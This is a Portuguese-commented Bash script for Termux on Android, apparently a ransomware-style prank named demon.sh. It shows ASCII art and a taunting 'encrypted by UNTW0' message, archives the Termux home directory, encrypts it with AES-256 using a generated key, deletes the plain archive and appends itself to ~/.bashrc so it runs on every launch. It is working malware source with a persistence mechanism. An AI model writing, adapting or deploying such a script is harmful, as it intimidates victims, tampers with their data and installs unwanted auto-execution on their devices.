#!/bin/bash

# Caminho do script
SCRIPT_PATH="/data/data/com.termux/files/home/demon.sh"

# Diretório onde os dados serão armazenados
DATA_DIR="/data/data/com.termux/files/home/termux_data"
ENCRYPTED_DIR="/data/data/com.termux/files/home/termux_data_encrypted"
BACKUP_FILE="$DATA_DIR/backup.tar.gz"
ENCRYPTED_FILE="$ENCRYPTED_DIR/backup.tar.gz.enc"
KEY_FILE="$ENCRYPTED_DIR/encryption_key.key"

# Função para configurar o Termux
setup_termux() {
    # Verificar se o comando foi adicionado ao .bashrc
    if ! grep -q "$SCRIPT_PATH" ~/.bashrc; then
        echo "Configurando Termux para executar o script automaticamente..."
        echo "$SCRIPT_PATH" >> ~/.bashrc
        echo "Configuração concluída. Termux será reiniciado."
    else
        echo "Termux já configurado para executar o script automaticamente."
    fi
}

# Função principal
main() {
    # Arte ASCII
    cat << "EOF"
                                  ,
                                  /(        )\`
                                  \\ \___   / |
                                  /- _  \`-/  '
                                (/\\\/ \ \   /\\
                                / /   | \`    \\
                                O O   ) /    |
                                \`-^--'\`<     '
                              (_.)  _  )   /
                                 \`.___/ \`    /
                                  \`-----' /
                      <----.     __ / __   \\
                      <----|====O)))==) \\) /====
                      <----'    \`--' \`.__,' \\
                                  |        |
                                    \\       /
                              ______( (_  / \______
                            ,'  ,-----'   |        \\
                            \`--{__________)        \\
EOF

    # Mensagem
    echo "TOMOU UMA CRIPTOGRAFADA INSANA DO UNTW0 KKKKKKKKKKKKKKKKKKKKKKK"

    # Simulação de carregamento
    total_steps=20  # Número total de etapas de carregamento
    delay=0.5       # Tempo de espera entre cada etapa em segundos
    progress=0      # Valor inicial do progresso

    echo -n "["
    while [ $progress -le $total_steps ]; do
        sleep $delay
        progress=$((progress + 1))
        filled=$(printf "%0.s#" $(seq 1 $progress))
        empty=$(printf "%0.s " $(seq $progress $total_steps))
        echo -n "$filled$empty"
    done
    echo "]"
    echo "100%"

    # Coletar dados
    echo "Coletando dados do Termux..."
    mkdir -p "$DATA_DIR"
    mkdir -p "$ENCRYPTED_DIR"
    tar -czf "$BACKUP_FILE" /data/data/com.termux/files/home

    # Gerar uma chave de criptografia
    openssl rand -base64 32 > "$KEY_FILE"

    # Criptografar o backup
    echo "Criptografando os dados..."
    openssl enc -aes-256-cbc -salt -in "$BACKUP_FILE" -out "$ENCRYPTED_FILE" -pass file:"$KEY_FILE"

    # Limpar o backup não criptografado
    rm "$BACKUP_FILE"

    # Configurar o Termux
    setup_termux

    # Reiniciar Termux
    echo "Reiniciando Termux..."
    sleep 1
    termux-reload-settings
}

# Executar a função principal
main
